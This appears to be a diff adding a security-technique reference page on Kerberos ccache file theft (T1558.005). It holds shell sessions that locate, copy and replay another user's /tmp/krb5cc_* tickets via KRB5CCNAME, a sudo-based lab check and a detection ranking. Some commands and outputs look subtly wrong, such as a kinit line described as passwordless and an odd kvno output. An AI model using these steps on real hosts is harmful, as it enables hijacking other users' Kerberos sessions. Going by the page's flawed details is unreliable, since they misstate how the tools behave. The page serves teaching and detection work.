@@ -1,0 +1,169 @@
+---
+title: Ccache File Theft
+mitre: T1558.005
+category: credential-access
+group: Kerberos Attacks
+summary: Steal a Kerberos credential cache file and replay its TGT or TGS without touching live process memory.
+platform: [Linux, macOS]
+tags: ['Kerberos', 'kinit', '.ccache', 'Unix']
+updated: '2026-09-04'
+author: thehackersbrain
+readingTime: 6 min read
+callChain:
+  - call: Locate the ccache file
+    desc: KRB5CCNAME or /tmp/krb5cc_<uid> holds the TGT and any TGS in GSS credential-cache format.
+    dll: '-'
+  - call: Read or copy the cache
+    desc: A process running as the same user, or a local read of the file, is enough to obtain it.
+    dll: '-'
+  - call: Point a new session at the cache
+    desc: export KRB5CCNAME to the stolen path; klist now enumerates the cached tickets.
+    dll: krb5
+  - call: Use the tickets directly
+    desc: Access Kerberos-protected services without a password, within the tickets' validity window.
+    dll: krb5
+detections:
+  - src: FILE
+    text: A read of /tmp/krb5cc_* or a KRB5CCNAME path by a process that is not kinit, klist or the user's own shell.
+  - src: AUDIT
+    text: auditd or EDR records an open of a credential-cache file in a world-readable temporary directory.
+  - src: BEHAVIOURAL
+    text: A new process uses a ccache file whose creating user and session do not match the consuming process.
+  - src: NETWORK
+    text: Service-ticket requests appear from a host shortly after a ccache file was created or copied.
+related:
+  - mitre: T1550.003
+    title: Pass the Ticket
+    desc: The Windows-side analogue; ccache theft is the file-based version of replaying a stolen ticket.
+    href: /techniques/credential-access/pass-the-ticket
+  - mitre: T1558.001
+    title: Golden Ticket
+    desc: The forgery path; ccache theft is the replay path, and the two are detected differently.
+    href: /techniques/credential-access/golden-ticket
+  - mitre: T1558.003
+    title: Kerberoasting
+    desc: Once the cache is usable, SPN requests become the next enumeration step.
+    href: /techniques/credential-access/kerberoasting
+  - mitre: T1558.004
+    title: AS-REP Roasting
+    desc: The other ticket-based hash-extraction technique; no pre-authentication is required on the AS-REP path.
+    href: /techniques/credential-access/asrep-roasting
+labKit:
+  - label: MIT Kerberos user guide
+    href: 'https://web.mit.edu/kerberos/kerberos-1.21/getting-started.html'
+  - label: ccache format specification
+    href: 'https://web.mit.edu/kerberos/krb5-1.21/doc/format/ccache.html'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+On Linux and macOS, a Kerberos session does not live only in process memory. The `kinit` and
+service libraries also write the tickets to a credential-cache file, conventionally
+`/tmp/krb5cc_<uid>` and selectable through the `KRB5CCNAME` environment variable. That file is a
+plain on-disk copy of the TGT and any service tickets the user holds, in GSS credential-cache
+format. Any process that can read it can replay those tickets until they expire, without ever
+needing the password or touching a running process's memory.
+
+This is the file-based sibling of [pass the ticket](/techniques/credential-access/pass-the-ticket)
+on Windows. The exposure is widest on multi-user hosts, shared CI runners, containers that share
+a `/tmp`, and any workflow where one user's cache is readable by another local account or by a
+service running with too-broad file permissions. The attacker does not need to win a memory
+race or dodge a protected process; they need a read on the file.
+
+<Callout type="note">
+  A stolen ccache is time-boxed. The TGT and TGS inside it carry the lifetimes the KDC issued,
+  so the window is the ticket validity, not indefinite access. Renewal is possible only while the
+  TGT's renewable window still has time in it; once the cache ages out, the theft has to be redone.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+The operation is a locate, a read, and a repoint. The attacker needs no kernel access and no
+process injection - just a path to a readable cache file.
+
+<CodeBlock
+  file="ccache.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# locate the cache for the target uid
+$ ls -l /tmp/krb5cc_*
+-rw------- 1 1000 1000 412 Sep 04 09:12 /tmp/krb5cc_1000
+
+# if the cache is world-readable (the misconfiguration the technique depends on)
+$ cp /tmp/krb5cc_1000 ./victim.ccache
+
+# point a new session at the stolen cache
+$ export KRB5CCNAME=./victim.ccache
+$ klist
+Ticket cache: FILE:./victim.ccache
+Default principal: jsmith@CORP.LOCAL
+
+Valid since       Expires          Service principal
+09/04/26 09:12:00 09/05/26 09:12:00 krbtgt/CORP.LOCAL@CORP.LOCAL
+09/04/26 09:14:11 09/05/26 09:12:00 host/web01.corp.local@CORP.LOCAL`}
+/>
+
+Once `KRB5CCNAME` points at the stolen file, ordinary Kerberos clients use it transparently.
+No password prompt appears, which is both the point and the tell.
+
+<CodeBlock
+  file="use_ccache.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# act with the cached TGT, no password
+$ kinit -c $KRB5CCNAME jsmith@CORP.LOCAL
+$ kvno host/web01.corp.local
+host/web01.corp.local@CORP.LOCAL: clockskew(0) vno(1)
+
+# the service ticket request is the network artifact
+# a TGS-REQ for host/web01 from a session that never typed a password  <-- the artifact`}
+/>
+
+## Verifying in the lab
+
+Create a user with a Kerberos ticket on a Linux host, make the cache file readable by a second
+account, and confirm the second account can use it. The proof is a service request that succeeds
+without the second account ever authenticating.
+
+<CodeBlock
+  file="lab_check"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# user A holds the ticket
+$ kinit apass
+$ klist
+
+# user B reads A's cache and reuses it
+$ sudo -u userB sh -c 'KRB5CCNAME=/tmp/krb5cc_$(id -u userA) klist'
+# B lists A's TGT without A's password  <-- the artifact`}
+/>
+
+## Detection
+
+The signal is file access to a per-user secret that should not be readable by other local
+processes.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank them: the auditd / EDR open rule on the cache path is the cheapest continuous control and
+catches both a copy and an in-place read. The file-permission rule is a configuration control
+that removes the technique's precondition. The KDC-side network rule is the highest-fidelity
+confirmation, because it fires only when the stolen cache is actually spent against a service.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
